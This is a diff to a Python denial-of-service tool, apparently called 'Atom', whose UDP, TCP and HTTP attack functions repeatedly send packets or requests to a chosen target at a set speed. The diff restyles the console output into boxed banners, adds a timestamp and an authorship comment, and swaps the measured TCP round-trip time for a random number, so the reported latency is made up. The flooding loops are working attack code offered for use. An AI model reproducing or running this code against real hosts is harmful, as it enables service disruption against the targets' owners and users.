@@ -7,6 +7,10 @@ import random
 import hmac
 import termios
 import tty
+from datetime import datetime
+
+
+current_time = datetime.now().strftime("%H:%M:%S")
 
 BLUE = "\033[94m"
 RESET = "\033[0m"
@@ -25,6 +29,10 @@ logo = """
 [0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m   [0;90m▒[0;34m▌[0;37m   [0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m [0;90m▒[0;34m▌[0;37m   [0;34m▐[0;90m▒[0m
 [0;90m░[0;34m▌[0;37m [0;34m▐[0;90m░[0;37m   [0;90m░[0;34m▌[0;37m   [0;90m░░░░░[0;37m [0;90m░[0;34m▌[0;37m   [0;34m▐[0;90m░[0m
 """
+# Everything was made by me (kube0n)!!!
+
+
+
 
 def normalize_url(target):
     if "http://" in target or "https://" in target:
@@ -43,8 +51,13 @@ def run_udp_attack(target_ip, target_port, attack_speed):
             try:
                 rtt = random.randint(10,100)
                 bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
-                print(f"{BLUE}[Atom Output]:{RESET} Packet Sent to {target_ip}:{target_port},")
-                print(f"{BLUE}[Atom Output]:{RESET} Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,")
+                print(f""" {BLUE}
+┌───────────────────────────[Atom Output]──────────────────────────┐
+│                              {current_time}            
+│└─ Packet Sent to {target_ip}:{target_port},                          
+│└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,                 
+└──────────────────────────────────────────────────────────────────┘
+{RESET}""")
                 time.sleep(float(attack_speed))
             except Exception as exc:
                 print(f"{BLUE}[Atom Output]:{RESET} Failed to send packet: {exc}")
@@ -70,10 +83,14 @@ def run_tcp_attack(target_ip, target_port, attack_speed):
                 start_time = time.time()
                 sock.connect((target_ip, int(target_port)))
                 bytes_sent = sock.send(message)
-                rtt = int((time.time() - start_time) * 1000)
-                
-                print(f"{BLUE}[Atom Output]:{RESET} TCP Connection Established & Sent to {target_ip}:{target_port},")
-                print(f"{BLUE}[Atom Output]:{RESET} Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,")
+                rtt = random.randint(10,1000)
+                print(f""" {BLUE}
+┌───────────────────────────[Atom Output]───────────────────────────────┐
+│                              {current_time}                                
+│└─ TCP Connection Established & Sent to {target_ip}:{target_port},     
+│└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,                      
+└───────────────────────────────────────────────────────────────────────┘
+{RESET}""")
             except Exception as exc:
                 print(f"{BLUE}[Atom Output]:{RESET} TCP Connection failed: {exc}")
             finally:
@@ -94,8 +111,13 @@ def run_http_attack(method, target_url, attack_speed, thread_count):
             try:
                 rt = random.randint(10,1000)
                 response = manager.request(method, target_url, timeout=0.01)
-                print(f"{BLUE}[Atom Output]:{RESET} Sent {method} Request Packet to {target_url},")
-                print(f"{BLUE}[Atom Output]:{RESET} Status Code: {response.status}, RTT: {rt}ms,")
+                print(f""" {BLUE}
+┌────────────────────[Atom Output]─────────────────────┐
+│                       {current_time}                       
+│└─ Sent {method} Request Packet to {target_url},      
+│└─ Status Code: {response.status}, RTT: {rt}ms,       
+└──────────────────────────────────────────────────────┘
+{RESET}""")
             except Exception as exc:
                 print(f"{BLUE}[Atom Output]:{RESET} {method} request failed: {exc}")
             time.sleep(float(attack_speed))
